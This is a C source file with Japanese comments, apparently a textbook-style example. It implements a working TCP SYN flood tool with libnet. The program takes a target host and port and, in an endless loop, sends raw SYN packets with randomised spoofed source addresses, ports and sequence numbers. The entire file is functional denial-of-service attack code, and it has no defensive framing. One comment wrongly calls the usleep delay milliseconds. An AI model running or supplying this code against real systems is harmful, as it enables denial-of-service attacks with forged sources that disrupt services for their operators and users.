#include <libnet.h>

#define FLOOD_DELAY 5000 // パケット注入の遅延時間は5000msである。

/* x.x.x.x形式のIPを返す */
char *print_ip(u_long *ip_addr_ptr) {
   return inet_ntoa( *((struct in_addr *)ip_addr_ptr) );
}


int main(int argc, char *argv[]) {
   u_long dest_ip;
   u_short dest_port;
   u_char errbuf[LIBNET_ERRBUF_SIZE], *packet;
   int opt, network, byte_count, packet_size = LIBNET_IP_H + LIBNET_TCP_H;

   if(argc < 3)
   {
      printf("使用方法：\n%s\t ＜対象ホスト＞ ＜対象ポート＞\n", argv[0]);
      exit(1);
   }

   dest_ip = libnet_name_resolve(argv[1], LIBNET_RESOLVE); // ホスト
   dest_port = (u_short) atoi(argv[2]); // ポート番号 


   network = libnet_open_raw_sock(IPPROTO_RAW); // ネットワークインタフェースをオープンする
   if (network == -1)
      libnet_error(LIBNET_ERR_FATAL, "can't open network interface.  -- this program must run as root.\n");
   libnet_init_packet(packet_size, &packet); // パケット用のメモリを割り当てる
   if (packet == NULL)
      libnet_error(LIBNET_ERR_FATAL, "can't initialize packet memory.\n");

   libnet_seed_prand(); // 乱数生成器に種を与える

   printf("SYN Flooding port %d of %s..\n", dest_port, print_ip(&dest_ip));
   while(1) // 永久ループ（CTRL-Cで終了されるまで）
   {
      libnet_build_ip(LIBNET_TCP_H,      // IPヘッダを除いたパケットのサイズ
         IPTOS_LOWDELAY,                 // IP tos 
         libnet_get_prand(LIBNET_PRu16), // IP ID（乱数化）
         0,                              // 断片化 
         libnet_get_prand(LIBNET_PR8),   // TTL （乱数化）
         IPPROTO_TCP,                    // トランスポートプロトコル
         libnet_get_prand(LIBNET_PRu32), // 送信元IP （乱数化）
         dest_ip,                        // 宛先IP 
         NULL,                           // ペイロード（なし）
         0,                              // ペイロード長
         packet);                        // パケットヘッダメモリ

      libnet_build_tcp(libnet_get_prand(LIBNET_PRu16), // 送信元TCPポート （乱数化）
         dest_port,                      // 宛先TCPポート
         libnet_get_prand(LIBNET_PRu32), // シーケンス番号 （乱数化）
         libnet_get_prand(LIBNET_PRu32), // ACK番号 （乱数化）
         TH_SYN,                         // コントロールフラグ （SYNフラグのみ設定）
         libnet_get_prand(LIBNET_PRu16), // ウィンドウサイズ （乱数化）
         0,                              // 至急ポインタ
         NULL,                           // ペイロード （なし）
         0,                              // ペイロード長
         packet + LIBNET_IP_H);          // パケットヘッダメモリ

      if (libnet_do_checksum(packet, IPPROTO_TCP, LIBNET_TCP_H) == -1)
         libnet_error(LIBNET_ERR_FATAL, "can't compute checksum\n");

      byte_count = libnet_write_ip(network, packet, packet_size); // パケットを注入する
      if (byte_count < packet_size)
         libnet_error(LIBNET_ERR_WARNING, "Warning: Incomplete packet written.  (%d of %d bytes)", byte_count, packet_size);

      usleep(FLOOD_DELAY); // FLOOD_DELAYミリ秒待機する
   }

   libnet_destroy_packet(&packet); // パケットメモリを解放する

   if (libnet_close_raw_sock(network) == -1) // ネットワークインタフェースをクローズする
      libnet_error(LIBNET_ERR_WARNING, "can't close network interface.");

   return 0;
}
